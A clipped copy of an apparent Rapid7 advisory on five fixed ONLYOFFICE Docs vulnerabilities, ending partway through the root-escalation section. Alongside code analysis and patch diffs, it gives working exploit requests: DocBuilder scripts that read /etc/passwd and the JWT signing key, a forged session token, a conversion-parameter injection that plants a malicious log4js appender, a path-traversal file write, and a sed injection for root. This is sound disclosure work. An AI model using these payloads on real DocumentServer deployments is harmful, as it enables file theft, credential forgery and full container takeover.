---
title: Back Button
source: https://www.rapid7.com/blog/post/ve-from-view-only-access-to-container-root-five-vulnerabilities-in-onlyoffice-docs-fixed
source_host: www.rapid7.com
clip_date: 2026-11-19T09:14:05+08:00
trace_id: 05f16e05-7b93-4560-af02-62fae5f7487d
content_hash: 68291611303aea42e4e6fd24bc243b300939353694e3207397d482d2cd18806d
status: synced
tags: []
series: null
feed_source: Rapid7 Blog
ai_summary: null
ai_summary_style: null
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 41d75244-d011-81b2-ad92-ffb28a4437e3
ioc:
  cves:
    - CVE-2026-110385
    - CVE-2026-113627
    - CVE-2026-113630
    - CVE-2026-113631
    - CVE-2026-97727
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

## Overview

As part of our [research into Zimbra Collaboration Suite](https://github.com/jburgess-r7/zimbra-vulnerability-tracker), Rapid7 reported five findings in ONLYOFFICE Docs. An attacker with view-only access to a document can chain vulnerabilities in ONLYOFFICE Docs to execute arbitrary operating system commands as root inside the official DocumentServer container.

The findings also expose server files and document data that the viewer never displays, even when downloading is disabled.

| **CVE** | **Finding** | **CVSS** |
| --- | --- | --- |
| [CVE-2026-113627](https://www.cve.org/CVERecord?id=CVE-2026-113627) | DocBuilder native file read and Session JWT forgery | [7.1 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N) |
| [CVE-2026-110385](https://www.cve.org/CVERecord?id=CVE-2026-110385) | DocBuilder SaveFile conversion parameter injection and code execution | [8.7 High](https://www.cve.org/CVERecord?id=CVE-2026-110385) |
| [CVE-2026-97727](https://www.cve.org/CVERecord?id=CVE-2026-97727) | Complete-save format path traversal and arbitrary file write | [6.5 Medium](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N) |
| [CVE-2026-113630](https://www.cve.org/CVERecord?id=CVE-2026-113630) | Root-helper command injection | [7.8 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| [CVE-2026-113631](https://www.cve.org/CVERecord?id=CVE-2026-113631) | View-only export of non-rendered document data | [6.5 Medium](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |

ONLYOFFICE confirmed on October 23, 2026 that all five findings were fixed in Document Server 10.0. The [changelog](https://github.com/ONLYOFFICE/DocumentServer/blob/v10.0.0/CHANGELOG.md#security) describes the release's security changes.

Proof-of-concept code is available on the accompanying [Github repository](https://github.com/jburgess-r7/onlyoffice-2026-pocs).

## Product description

[ONLYOFFICE Docs](https://github.com/ONLYOFFICE/DocumentServer) provides online viewers and editors for documents, spreadsheets, presentations, forms and PDFs. It supports collaborative editing and can integrate with applications that store and share files.

An integrating application, for example Zimbra Collaboration Suite, supplies an opening configuration identifying the document and the user's permissions, signed with the Browser key. This client-visible credential is referred to below as the Editor JWT. After opening a document, DocumentServer issues a Session JWT for reconnecting and saving.

Incoming service requests, including document-building jobs, are validated using ONLYOFFICE's Inbox JWT key. DocumentServer can also send generated document output to the integrating application's callback URL.

## Credit

This assessment and the exploit-chain research were conducted by Jonah Burgess (CryptoCat), Senior Security Researcher at [Rapid7](https://www.rapid7.com/). The findings are being disclosed in accordance with [Rapid7's vulnerability disclosure policy](https://www.rapid7.com/security/disclosure/).

## Testing setup

Rapid7 tested the official onlyoffice/documentserver:9.4.0 image with package onlyoffice-documentserver 9.4.0-129. DocumentServer ran as the ds account. JWT validation remained enabled, and no authentication check, private-address filter, or vendor code was disabled or modified. Browser and Inbox validation used the same effective signing key.

Our analysis of the vendor supplied fixes compares the v9.4.0.129 and v10.0.0.169 tags of [ONLYOFFICE/server](https://github.com/ONLYOFFICE/server/compare/v9.4.0.129...v10.0.0.169), [ONLYOFFICE/core](https://github.com/ONLYOFFICE/core/compare/v9.4.0.129...v10.0.0.169) and [ONLYOFFICE/document-server-package](https://github.com/ONLYOFFICE/document-server-package/compare/v9.4.0.129...v10.0.0.169). Rapid7 also performed targeted checks on package 10.0.0-169. For the [conditional WOPI test](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.uv0o4zruwf3v) on 9.4.0-129, Rapid7 enabled only WOPI_ENABLED=true and left the shipped WOPI IP filter unchanged at its default allow-all rule.

Exploitation was demonstrated only on 9.4.0-129; the broader affected-version range is unknown.

## Impact

View-only document access can lead to command execution as ds and then root inside the official container. The two [exploit chains](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.uv0o4zruwf3v) use different file-write stages. With WOPI enabled and an attacker-controlled source reachable and permitted by its IP filter, the same DocBuilder authorization failure provides an unauthenticated entry.

Separately, a viewer denied download can obtain a reconstructed DOCX containing custom XML, custom properties and field instructions that the viewer never displayed.

## Editor JWT authorizes native file reads and session JWT forgery (CVE-2026-113627)

An attacker with view-only access to a document can use /docbuilder to steal files from the ONLYOFFICE server. In the tested build, this exposed the Session JWT signing key, allowing the attacker to forge credentials containing document keys and permissions that were never granted to the original viewer.

### Technical analysis

**Prerequisite:** The attacker needs a valid Editor JWT for any document and access to /docbuilder. Target files must be readable by ds. The token-forgery step also requires the Session JWT signing key to be in a readable file, as it was in the tested build. No edit, download, print, review, or comment permission is required.

The default-secret branch in [getTenantSecret()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/tenantManager.js#L215-L227) contains:

```javascript
switch (type) {
case commonDefines.c_oAscSecretType.Browser:
case commonDefines.c_oAscSecretType.Inbox:
    res = utils.getSecretByElem(cfgSecretInbox); // [0] Shared signing key
break;
// ... other token types omitted ...
}
```

The branch at \[0\] selects the same configured signing key for Browser and Inbox tokens.

[builderRequest()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/converterservice.js#L460-L519) passes the request to [getRequestParams()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/DocsCoServer.js#L1697-L1742):

```javascript
const authRes = yield docsCoServer.getRequestParams(ctx, req); // [1] Request JWT validation
if (authRes.isDecoded) {
  cmd.setWithAuthorization(true);
}
```

At \[1\], builderRequest() delegates JWT validation to getRequestParams(). That function's query-token branch checks the signature using the Inbox key:

```javascript
if (tenTokenEnableRequestInbox) {
  res.code = constants.VKEY;
let checkJwtRes;
if (res.params.token) {
// [2] Inbox signature check
checkJwtRes = yield checkJwt(ctx, res.params.token, commonDefines.c_oAscSecretType.Inbox);
  } else {
    checkJwtRes = yield checkJwtHeader(ctx, req);
  }
// ... remaining validation and decoded-claim handling omitted ...
}
```

A view-only Editor JWT passes the signature check at \[2\] because Browser validation uses the same key. The check does not require the JWT to have been issued specifically for DocBuilder.

/docbuilder treats the POST body as a DocBuilder script. After the JWT check above succeeds, that script can call [GetFontBinary()](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/DesktopEditor/doctrenderer/embed/NativeControlEmbed.cpp#L61-L99) with a supplied filename:

```c
std::wstring sFile = file->toStringW();
bool bIsFullFilePath = (std::wstring::npos != sFile.find('\\') || std::wstring::npos != sFile.find('/'));
if (bIsFullFilePath)
{
    bIsFullFilePath = NSFile::CFileBinary::Exists(sFile); // [3] Path existence check
}

// ... font-map fallback omitted ...

return CJSContext::createUint8Array(sFile); // [4] Return file bytes
```

GetFontBinary() accepts an existing absolute path at \[3\] and returns its bytes at \[4\]. Ssani4 previously reported this native file-read behavior in [DocumentBuilder issue #147](https://github.com/ONLYOFFICE/DocumentBuilder/issues/147) on November 21, 2025. That report explicitly identified GetFontBinary() and ZipFileAsString() and used a Session JWT obtained from /downloadas to authorize /docbuilder. ONLYOFFICE closed the issue as fixed in DocumentBuilder 9.2.0.

Rapid7 reproduced GetFontBinary() file reads in 9.4.0-129 using a view-only Editor JWT, then demonstrated session-signing-key theft and token forgery. The native read itself was previously reported; the analysis here documents its continued exposure through that entry point and its role in the subsequent chains.

### Exploitation

![oo\_disc\_1.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5238b76d5587b8f5.png)

#### Reading a server file

The attacker submits a DocBuilder script using a JWT issued for view-only access to any document. The request fragment is:

```html
POST /docbuilder?token=VIEW_ONLY_EDITOR_JWT HTTP/1.1
Host: docs.example.test
Content-Type: application/octet-stream

builder.CreateFile("docx");
var bytes = native.GetFontBinary("/etc/passwd");
if (bytes === null || typeof bytes === "undefined") throw new Error("read failed");
var hex = "";
for (var i = 0; i < bytes.length; i++)
    hex += ("0" + bytes[i].toString(16)).slice(-2);
var paragraph = Api.CreateParagraph();
paragraph.AddText("R7FILE:" + hex + ":END");
Api.GetDocument().Push(paragraph);
builder.SaveFile("docx", "stolen.docx");
builder.CloseFile();
```

DocumentServer executes the script as ds and returns a URL for stolen.docx. The PoC downloads stolen.docx, extracts the hex between R7FILE: and:END from word/document.xml, and decodes it to recover the contents of /etc/passwd. Hex encoding supports binary files; the delimiters let the extractor locate the payload and reject output missing either boundary.

#### Stealing the session signing key

The attacker repeats the same request for /etc/onlyoffice/documentserver/local.json. In the tested configuration, services.CoAuthoring.secret.session.string contained the Session JWT signing key. If services.CoAuthoring.secret.session.file instead names a key file, the attacker reads that file with the same GetFontBinary() request.

#### Forging a save credential

The attacker chooses the document key, permissions and user ID, then signs the following claims with the stolen Session JWT key using HMAC-SHA256. For this save operation, the user ID does not need to correspond to an existing account:

```json
{
  "document": {
    "key": "external-document-20260821",
    "permissions": {
      "download": true,
      "print": true
    }
  },
  "editorConfig": {
    "user": {
      "id": "rapid7-poc",
      "index": 1
    }
  },
  "iat": 1787329293,
  "exp": 1787329593
}
```

The attacker submits a normal SAVE_TYPE_PART_START request using the forged JWT and an attacker-chosen document key. DocumentServer returns a server-generated save key, proving that it accepts the forged credential and its ungranted document permissions.

#### PoC

The [file-read and JWT-forgery PoC](https://github.com/jburgess-r7/onlyoffice-2026-pocs/blob/main/pocs/editor_token_docbuilder_jwt_forgery.py) uses a view-only Editor JWT to read /etc/passwd, steal the Session JWT signing key and verify a forged token for an attacker-chosen document key:

```cpp
python3 pocs/editor_token_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --token-file /secure/view-only.jwt \
  --read-file /etc/passwd \
  --read-output /tmp/stolen-passwd \
  --document-key external-document-20260821 \
  --output-token /tmp/forged-session.jwt \
  --timeout 180
```

Output excerpt:

```
[+] read 1220 bytes from /etc/passwd to /tmp/stolen-passwd
[+] forged session JWT accepted for document key: external-document-20260821 (save key _7717)
[+] forged JWT written to: /tmp/forged-session.jwt
[+] forged JWT (expires at Unix time 1787329593):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb2N1bWVudCI6eyJrZXkiOiJleHRlcm5hbC1kb2N1bWVudC0yMDI2MDgyMSIsInBlcm1pc3Npb25zIjp7ImRvd25sb2FkIjp0cnVlLCJwcmludCI6dHJ1ZX19LCJlZGl0b3JDb25maWciOnsidXNlciI6eyJpZCI6InJhcGlkNy1wb2MiLCJpbmRleCI6MX19LCJpYXQiOjE3ODczMjkyOTMsImV4cCI6MTc4NzMyOTU5M30.VlXcl09_669zHtwiJFZDLFRtQbi_HTt7zncmPYUHLww
```

The file recovered to the attacker's machine contained the target's account data:

```html
$ head -n 5 /tmp/stolen-passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

The JWT printed above was signed with the key recovered from local.json. DocumentServer accepted that signature during the normal save-key reservation:

```json
{"status":"ok","data":"_7717"}
```

### Impact

The attacker can steal any file readable by ds. On the tested system, this included the Session JWT signing key, allowing the attacker to create credentials with document keys and permissions that were never granted to the original viewer. DocumentServer accepted the forged JWT for a save operation under a new document key. The demonstrated unauthorized save accounts for the low integrity impact in the [**7.1 High**](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N) score.

The same editor-JWT authorization failure also allowed a view-only user to supply a private-network URL to Api.CreateImage(). DocumentServer fetched the URL and returned a decodable image inside a generated DOCX. This narrower consequence shares the authorization root cause above and is not treated as a separate finding.

### Fix

In 10.0.0-169, [builderRequest()](https://github.com/ONLYOFFICE/server/blob/v10.0.0.169/DocService/sources/converterservice.js#L500-L512) now tells the token validator that this is a DocBuilder request:

```
-const authRes = yield docsCoServer.getRequestParams(ctx, req);
+authRes = yield docsCoServer.getRequestParams(ctx, req, constants.JWT_PURPOSE_DOCBUILDER);
```

With the default settings, the new [check](https://github.com/ONLYOFFICE/server/blob/v10.0.0.169/DocService/sources/jwtService.js#L51-L112) rejects tokens containing document-opening fields such as editorConfig and WOPI fileInfo, even if their signatures are valid. This blocks reuse of a view-only Editor JWT at /docbuilder, as confirmed in the 10.0.0-169 test.

The [native file-read code](https://github.com/ONLYOFFICE/core/blob/v10.0.0.169/DesktopEditor/doctrenderer/embed/NativeControlEmbed.cpp#L81-L119) also checks supplied paths against the font map in server mode. An unknown path falls back to the default font rather than being read as the requested file.

## DocBuilder conversion parameter injection enables code execution (CVE-2026-110385)

A DocBuilder script can replace the source path, destination path, and formats chosen by DocumentServer, extracting attacker-controlled files into any existing directory writable by ds. In the tested release, extracting a log4js appender and runtime configuration into the Data directory causes DocService to load and execute attacker code without a restart.

### Technical analysis

**Prerequisite:** The attacker needs a request accepted by /docbuilder. The destination directory must already exist and be writable by ds. Immediate process execution additionally requires a writable directory containing a runtime configuration watched by DocService; the default Data directory in the tested official image met this condition.

The DocBuilder text-script dispatcher in [CDocBuilder::RunTextA()](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/DesktopEditor/doctrenderer/docbuilder_p.cpp#L1506-L1521) forwards the optional third builder.SaveFile() argument without restricting it to supported conversion options:

```c
const wchar_t* sParams = NULL;
if (nCountParameters > 2)
    sParams = _builder_params[2].c_str(); // [0] Caller-supplied XML

// [1] Forward conversion parameters
int nSaveError = this->SaveFile(nFormat, _builder_params[1].c_str(), sParams);
```

The third argument at \[0\] reaches the private save implementation unchanged at \[1\].

[CDocBuilder_Private::SaveFile()](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/DesktopEditor/doctrenderer/docbuilder_p.h#L1057-L1085) XML-encodes its own source and destination paths, but then appends the attacker string as raw XML:

```c
oBuilder.WriteString(L"<?xml version=\"1.0\" 
encoding=\"utf-8\"?><TaskQueueDataConvert><m_sFileFrom>");
oBuilder.WriteEncodeXmlString(m_sFileDir); // [2] Encode source path
oBuilder.WriteString(sFileBin + L"</m_sFileFrom><m_sFileTo>");
oBuilder.WriteEncodeXmlString(_path); // [3] Encode destination path
oBuilder.WriteString(L"</m_sFileTo><m_nFormatTo>");
oBuilder.WriteString(std::to_wstring(type));

// ... remaining server-generated fields omitted ...

if (!sConvertionParams.empty())
{
    oBuilder.WriteString(sConvertionParams); // [4] Append raw XML
}
```

The paths at \[2\] and \[3\] are XML-encoded, but the raw XML appended at \[4\] can introduce duplicate task fields after the server-generated values.

X2T's [InputParams parser](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/X2tConverter/src/cextracttools.h#L697-L720) processes elements sequentially and replaces an existing value whenever the same name appears again:

```c
else if (_T("m_sFileFrom") == sName)
{
    RELEASEOBJECT(m_sFileFrom);
    m_sFileFrom = new std::wstring(sValue); // [5] Replace source path
}
else if (_T("m_sFileTo") == sName)
{
    RELEASEOBJECT(m_sFileTo);
    m_sFileTo = new std::wstring(sValue); // [6] Replace destination path
}
else if (_T("m_nFormatFrom") == sName)
{
    RELEASEOBJECT(m_nFormatFrom);
    m_nFormatFrom = new int(XmlUtils::GetInteger(sValue)); // [7] Replace source format
}
else if (_T("m_nFormatTo") == sName)
{
    RELEASEOBJECT(m_nFormatTo);
    m_nFormatTo = new int(XmlUtils::GetInteger(sValue)); // [8] Replace destination format
}
```

Assignments \[5\]–\[8\] let later XML elements replace the server-selected paths and formats. [getConversionDirection()](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/X2tConverter/src/cextracttools.h#L1197-L1206) maps source format 2057 (AVS_OFFICESTUDIO_FILE_OTHER_ZIP) and destination format 0 (AVS_OFFICESTUDIO_FILE_UNKNOWN) to the directory-extraction operation:

```c
else if (AVS_OFFICESTUDIO_FILE_OTHER_ZIP == nFormatFrom &&
         AVS_OFFICESTUDIO_FILE_UNKNOWN == nFormatTo)
    eRes = TCD_UNZIPDIR; // [9] Directory extraction mode
```

The extraction mode selected at \[9\] reaches [x2t()'s conversion dispatcher](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/X2tConverter/src/ASCConverters.cpp#L2034-L2042), which uses both attacker-selected paths without containment validation:

```c
case TCD_UNZIPDIR:
{
    result = zip2dir(sFileFrom, sFileTo); // [10] Extract archive
}
break;
```

zip2dir() at \[10\] reads the attacker-selected archive and extracts it into the selected directory writable by ds.

Writing DocService's runtime configuration provides a route from this file write to code execution. [runtimeConfigManager](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/runtimeConfigManager.js#L148-L157) watches the configuration directory and automatically reloads runtime.json when it is created or changed, passing its attacker-controlled log options to the logger:

```javascript
getConfig(operationContext.global)
  .then(config => {
    logger.configureLogger(config?.log?.options); // [11] Reload logging options
})
```

Those options reach [configureLogger()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/logger.js#L90-L92) at \[11\]; the function merges them with the cached configuration before calling log4js:

```javascript
function configureLogger(options) {
const mergedOptions = config.util.extendDeep({}, cachedLogConfig, options);
  log4js.configure(mergedOptions); // [12] Apply log4js configuration
}
```

The configuration applied at \[12\] sets the appender type to the extracted JavaScript module's absolute path. The log4js 6.9.1 appender loader [passes non-core types to require()](https://github.com/log4js-node/log4js-node/blob/v6.9.1/lib/appenders/index.js#L36-L50), executing that module in DocService.

### Exploitation

#### Preparing the payload files

To run id, the inner ZIP named r7-NONCE.zip contains r7-appender-NONCE.js:

```javascript
require("child_process").execFile(
  "/bin/sh", ["/var/www/onlyoffice/Data/r7-command-NONCE.sh"]
);
exports.configure = () => () => {};
```

r7-command-NONCE.sh:

```bash
#!/bin/sh
id > /tmp/r7-command-NONCE 2>&1
```

The shell script is a PoC convenience: [execFile()](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback) also supports /bin/sh with \["-c", "id > /tmp/r7-command-NONCE 2>&1"\]. Keeping the command in a file lets the root-helper chain reuse it without embedding the command body in the sed expression.

And runtime.json:

```json
{"log":{"options":{"appenders":{"default":{"type":"/var/www/onlyoffice/Data/r7-appender-NONCE.js"}},"categories":{"default":{"appenders":["default"],"level":"WARN"}}}}}
```

The attacker places that inner ZIP inside a second ZIP and base64-encodes the outer ZIP.

#### Staging the inner ZIP

The attacker submits the outer ZIP in a /docbuilder script. native.SetFilePath() selects /tmp as the native ZIP worker directory, and native.ZipOpenBase64() extracts the inner ZIP as /tmp/nativeZip/r7-NONCE.zip:

```javascript
builder.CreateFile("docx");
native.SetFilePath("/tmp/r7-NONCE-placeholder");
native.ZipOpenBase64("BASE64_OUTER_ZIP_CONTAINING_r7-NONCE.zip");
```

#### Extracting outside the job directory

The same request calls builder.SaveFile() with duplicate X2T task fields appended as conversion parameters:

```javascript
builder.SaveFile(
  "docx",
  "safe.docx",
  "<m_sFileFrom>/tmp/nativeZip/r7-NONCE.zip</m_sFileFrom>" +
  "<m_sFileTo>/var/www/onlyoffice/Data</m_sFileTo>" +
  "<m_nFormatFrom>2057</m_nFormatFrom><m_nFormatTo>0</m_nFormatTo>"
);
builder.CloseFile();
```

DocumentServer accepts the request and extracts all three files with attacker-controlled names and bytes into /var/www/onlyoffice/Data as ds. Writing runtime.json triggers the watcher, which loads r7-appender-NONCE.js and executes the command in DocService as ds without a restart.

#### PoC

Run the [DocBuilder PoC](https://github.com/jburgess-r7/onlyoffice-2026-pocs/blob/main/pocs/docbuilder_savefile_params_rce.py) with a view-only Editor JWT. The example uses --runtime-absent because the tested installation had no runtime.json:

```
python3 pocs/docbuilder_savefile_params_rce.py \
  --documentserver https://docs.example.test \
  --token-file /secure/view-only.jwt \
  --command id \
  --runtime-absent
```

Output:

```html
uid=101(ds) gid=102(ds) groups=102(ds)
```

### Impact

On the tested release, a user restricted to viewing any document can write files anywhere writable by ds and immediately execute arbitrary JavaScript in DocService. CVE-2026-110385 has a published [CVSS v4.0 score of **8.7 High**](https://www.cve.org/CVERecord?id=CVE-2026-110385).

### Fix

The [10.0.0-169 SaveFile() implementation](https://github.com/ONLYOFFICE/core/blob/v10.0.0.169/DesktopEditor/doctrenderer/docbuilder_p.h#L1174-L1178) filters the supplied conversion parameters before adding them to the X2T task:

```
-sConvertionParams = std::wstring(params);
+sConvertionParams = RemoveUnsafeX2tParams(std::wstring(params));
```

[RemoveUnsafeX2tParams()](https://github.com/ONLYOFFICE/core/blob/v10.0.0.169/DesktopEditor/doctrenderer/docbuilder_p.h#L954-L985) parses the supplied XML and removes m_sFileFrom, m_sFileTo and m_sTempDir. The submitted payload depends on overriding the first two fields to select its archive and extraction destination. Other conversion parameters remain supported.

## Complete-save format traversal enables arbitrary file write (CVE-2026-97727)

An attacker with a valid save session can place path traversal path segments in the requested output format and create or overwrite any file writable by ds on installations using filesystem storage. This file write also enables [remote code execution as ds](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.a4kln142eumw) through DocService's runtime logging configuration.

### Technical analysis

**Prerequisite:** The attacker needs a valid document Session JWT. The installation must use filesystem storage, and the destination must be writable by ds. No victim interaction is required.

The Session-token branch of [downloadAs()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/canvasservice.js#L1563-L1576) checks save permissions after validating the signature:

```javascript
const doc = checkJwtRes.decoded.document;
// [0] Save permission check
if (!doc.permissions || false !== doc.permissions.download || false !== doc.permissions.print) {
  isValidJwt = true;
  // ... document and user binding omitted ...
} else {
  ctx.logger.warn('Error downloadAs jwt: %s', 'access deny');
}
```

At \[0\], the save is denied only when both download and print are explicitly false. An absent permissions object or either absent flag passes this check.

[commandSave()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/canvasservice.js#L661-L669) appends the request's format directly to the filename prefix:

```javascript
const format = cmd.getFormat() || 'bin';
const completeParts = yield* saveParts(ctx, cmd, 'Editor.' + format); // [1] Requested format suffix
```

The suffix at \[1\] reaches [saveParts()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/canvasservice.js#L409-L424) unchanged. That function normalizes the filename only for save types other than SAVE_TYPE_COMPLETE_ALL:

```javascript
if (SAVE_TYPE_COMPLETE_ALL !== saveType) { // [2] Conditional filename normalization
  const ext = pathModule.extname(filename);
  const saveIndex = parseInt(cmd.getSaveIndex()) || 1; //prevent path traversal
  filename = pathModule.basename(filename, ext) + saveIndex + ext;
}
// ... save-key setup omitted ...
const buffer = cmd.getData();
// [3] Storage write
yield storage.putObject(ctx, cmd.getDocId() + cmd.getSaveKey() + '/' + filename, buffer, buffer.length);
```

For SAVE_TYPE_COMPLETE_ALL, the condition at \[2\] skips basename normalization, and \[3\] writes the resulting path. The filesystem backend [joins](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/storage/storage-fs.js#L44-L47) and [writes](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/storage/storage-fs.js#L74-L83) that path without checking that it remains beneath the document root.

### Exploitation

The cmd query parameter on /downloadas/ignored contains URL-encoded JSON. The request fragments below show that JSON decoded separately for readability.

#### Reserving a save key

The attacker first sends a normal SAVE_TYPE_PART_START request with their valid Session JWT:

```html
POST /downloadas/ignored?cmd=URL_ENCODED_COMMAND HTTP/1.1
Host: docs.example.test
Content-Type: application/octet-stream

reservation
```

The decoded *cmd* value in that request is:

```json
{
  "c": "save",
  "id": "ignored",
  "tokenSession": "DOCUMENT_SESSION_JWT",
  "saveindex": 1,
  "outputformat": 513,
  "withoutPassword": true,
  "format": "bin",
  "savetype": 0
}
```

DocumentServer returns a server-generated continuation key:

```json
{"status":"ok","data":"_5619"}
```

#### Writing outside the document directory

The attacker sends a second request using that key and SAVE_TYPE_COMPLETE_ALL. Its body contains the bytes to write, while format contains enough parent-directory components to reach the chosen absolute path:

```html
POST /downloadas/ignored?cmd=URL_ENCODED_COMMAND HTTP/1.1
Host: docs.example.test
Content-Type: application/octet-stream

ATTACKER_CONTROLLED_FILE_BYTES
```

The decoded cmd value in the second request is:

```json
{
  "c": "save",
  "id": "ignored",
  "tokenSession": "DOCUMENT_SESSION_JWT",
  "saveindex": 1,
  "outputformat": 513,
  "withoutPassword": true,
  "savekey": "_5619",
  "format": "/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/onlyoffice/rapid7-write.txt",
  "savetype": 3
}
```

DocumentServer returns the same continuation key, confirming that it accepted the complete save:

```json
{"status":"ok","data":"_5619"}
```

Because SAVE_TYPE_COMPLETE_ALL skips basename normalization, the filesystem backend resolves the traversal and writes the request body to /etc/onlyoffice/rapid7-write.txt as ds.

#### PoC

The [format-traversal PoC](https://github.com/jburgess-r7/onlyoffice-2026-pocs/blob/main/pocs/downloadas_format_traversal.py) uses a Session JWT to create /etc/onlyoffice/rapid7-write.txt:

```
python3 pocs/downloadas_format_traversal.py \
  --documentserver https://docs.example.test \
  --token-file /secure/document-session.jwt \
  --target-path /etc/onlyoffice/rapid7-write.txt \
  --data 'attacker-controlled configuration write'
```

Output:

```html
[*] requesting a server-generated save key
[+] reserved save key _5619
[+] traversal request accepted for /etc/onlyoffice/rapid7-write.txt
```

The new file contained the supplied data:

```html
$ cat /etc/onlyoffice/rapid7-write.txt
attacker-controlled configuration write
```

Testing created a new file rather than overwriting the running configuration. A permission audit found active local.json and default.json files in the same configuration tree writable by ds.

### Impact

The attacker can create or overwrite any file writable by ds. The demonstrated chain uses CVE-2026-113627 to forge a Session JWT, then CVE-2026-97727 to write a JavaScript appender, command script and runtime.json into /var/www/onlyoffice/Data. DocService loads the appender and executes the command as ds. The file-write primitive scores [**6.5 Medium**](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N).

### Fix

Unlike the [9.4.0-129 implementation](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/storage/storage-base.js#L62-L65), the shared [getStoragePath()](https://github.com/ONLYOFFICE/server/blob/v10.0.0.169/Common/sources/storage/storage-base.js#L61-L70) in 10.0.0-169 checks the normalized object key before handing it to a storage backend:

```javascript
-return opt_specialDir + '/' + tenantManager.getTenantPathPrefix(ctx) + strPath.replace(/\\/g, '/');
+const storagePath = opt_specialDir + '/' + tenantManager.getTenantPathPrefix(ctx) + strPath.replace(/\\/g, '/');
+const normalized = path.posix.normalize(storagePath);
+if (normalized !== opt_specialDir && !normalized.startsWith(opt_specialDir + '/')) {
+  throw new Error('getStoragePath: path escapes storage root');
+}
+return storagePath;
```

The check rejects a key that resolves outside the designated storage directory. commandSave() still constructs a filename from format; the new boundary is in the shared storage layer. In the 10.0.0-169 test, a genuine Session JWT reserved a normal save key, but the traversal request returned HTTP 400 and the target file was absent.

## Passwordless maintenance command elevates ds to root (CVE-2026-113630)

The installed sudo policy lets ds run documentserver-flush-cache.sh as root with unrestricted arguments. The script embeds its --hash argument into a GNU sed expression, allowing code running as ds to execute arbitrary commands as root.

### Technical analysis

**Prerequisite:** The attacker needs local command execution as ds.

The [documentserver sudoers file](https://github.com/ONLYOFFICE/document-server-package/blob/v9.4.0.129/common/documentserver/sudoers/documentserver#L4-L9) grants ds passwordless root execution of three scripts with unrestricted arguments:

```bash
Cmnd_Alias DS_ROOT_SCRIPTS = \
  /usr/bin/documentserver-letsencrypt.sh *, \
  /usr/bin/documentserver-generate-allfonts.sh *, \
  /usr/bin/documentserver-flush-cache.sh *  # [0] Unrestricted helper arguments

ds ALL=(root) NOPASSWD: DS_ROOT_SCRIPTS  # [1] Passwordless root execution
```

At \[0\], the \* permits ds to choose every argument supplied to documentserver-flush-cache.sh. At \[1\], sudo executes that script as root without asking for a password.

[documentserver-flush-cache.sh](https://github.com/ONLYOFFICE/document-server-package/blob/v9.4.0.129/common/documentserver/bin/documentserver-flush-cache.sh.m4#L3-L31) assigns the complete --hash argument to HASH and interpolates it directly into a sed program:

```bash
while [ "$1" != "" ]; do
  case $1 in
    -h | --hash )
      if [ "$2" != "" ]; then
        HASH=$2  # [2] Unchecked hash argument
        shift
      fi
    ;;
    # ... restart option omitted ...
  esac
  shift
done
API_PATH="/var/www/M4_DS_PREFIX/web-apps/apps/api/documents/api.js"
cp -f ${API_PATH}.tpl ${API_PATH}
sed -i "s/{{HASH_POSTFIX}}/${HASH}/g" ${API_PATH}  # [3] Sed interpolation
```

At \[2\], the script applies no character allowlist or length constraint. At \[3\], the attacker controls sed replacement text, delimiters, flags, and additional commands in the sed program. Because sudo has already changed the effective UID, GNU sed and every command reached through its e flag run as root.

The packaged api.js.tpl contains a matching line:

```javascript
const ver = '/9.4.0-{{HASH_POSTFIX}}'; // [4] Sed match target
```

The attacker supplies this --hash value:

```bash
';id > \/tmp\/r7-root;#'/e;#
```

The interpolation at \[3\] produces this sed expression:

```bash
s/{{HASH_POSTFIX}}/';id > \/tmp\/r7-root;#'/e;#/g
```

